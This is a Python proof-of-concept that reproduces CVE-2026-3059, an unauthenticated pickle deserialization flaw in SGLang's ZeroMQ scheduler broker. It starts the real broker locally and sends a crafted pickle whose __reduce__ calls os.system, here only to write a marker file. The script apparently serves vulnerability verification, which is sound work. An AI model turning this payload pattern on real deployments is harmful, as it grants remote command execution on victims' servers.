"""CVE-2026-3059 function-level reproduction.

Pinned SGLang v0.5.10 ``multimodal_gen/runtime/scheduler_client.py`` runs a
ZeroMQ REP broker and calls ``pickle.loads(payload)`` before any authentication
or schema validation.  The PoC imports the real upstream module (only the two
SGLang imports are stubbed because the package pulls CUDA extensions), starts
the real ``run_zeromq_broker`` coroutine, and sends a malicious pickle from a
REQ socket.
"""

from __future__ import annotations

import asyncio
import importlib.util
import json
import logging
import os
import pickle
import socket
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def _load_upstream(path: Path):
    stubs = {
        "sglang": types.ModuleType("sglang"),
        "sglang.multimodal_gen": types.ModuleType("sglang.multimodal_gen"),
        "sglang.multimodal_gen.runtime": types.ModuleType("sglang.multimodal_gen.runtime"),
        "sglang.multimodal_gen.runtime.server_args": types.ModuleType(
            "sglang.multimodal_gen.runtime.server_args"
        ),
        "sglang.multimodal_gen.runtime.utils": types.ModuleType(
            "sglang.multimodal_gen.runtime.utils"
        ),
        "sglang.multimodal_gen.runtime.utils.logging_utils": types.ModuleType(
            "sglang.multimodal_gen.runtime.utils.logging_utils"
        ),
    }
    for name, module in stubs.items():
        module.__path__ = []
        sys.modules[name] = module
    stubs["sglang.multimodal_gen.runtime.server_args"].ServerArgs = object
    stubs["sglang.multimodal_gen.runtime.utils.logging_utils"].init_logger = (
        lambda name: logging.getLogger(name)
    )
    spec = importlib.util.spec_from_file_location("uv_sglang_scheduler_client", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def _free_port() -> int:
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    return port


def main() -> None:
    import zmq

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")
    module = _load_upstream(source)

    text = poclib.MARKER_TEXT
    marker = str(poclib.MARKER_FILE)
    poclib.start_marker("ABSENT")
    port = _free_port()

    class Args:
        broker_port = port

    class Evil:
        def __reduce__(self):
            return (os.system, (f'echo {text} > "{marker}"',))

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    ctx = zmq.Context()
    payload = pickle.dumps(Evil(), protocol=4)

    async def run() -> str | None:
        task = asyncio.create_task(module.run_zeromq_broker(Args()))
        await asyncio.sleep(0.4)
        client = ctx.socket(zmq.REQ)
        client.setsockopt(zmq.LINGER, 0)
        client.connect(f"tcp://127.0.0.1:{port}")
        client.send(payload)
        await asyncio.sleep(0.6)
        client.close(0)
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        except Exception as exc:  # broker catches most errors; keep proof path deterministic
            return f"{type(exc).__name__}: {exc}"
        return None

    broker_error = asyncio.run(run())
    ctx.term()

    if not poclib.marker_ok():
        poclib.fail("broker did not unpickle the payload", broker_error=broker_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+zmq-REP",
                "entrypoint": "sglang.multimodal_gen.runtime.scheduler_client.run_zeromq_broker",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "socket": f"tcp://127.0.0.1:{port}",
                "payload_sha256": poclib.sha256_text(payload.hex()),
                "post_sink_error": broker_error,
                "stubbed_imports": ["sglang.multimodal_gen.runtime.server_args", "logging_utils"],
            },
            "request_response": [
                {
                    "dir": "offline client -> ZMQ REP broker",
                    "request": "pickle.dumps(object __reduce__ os.system(marker))",
                    "response": "broker unpickled before forward(); marker written",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
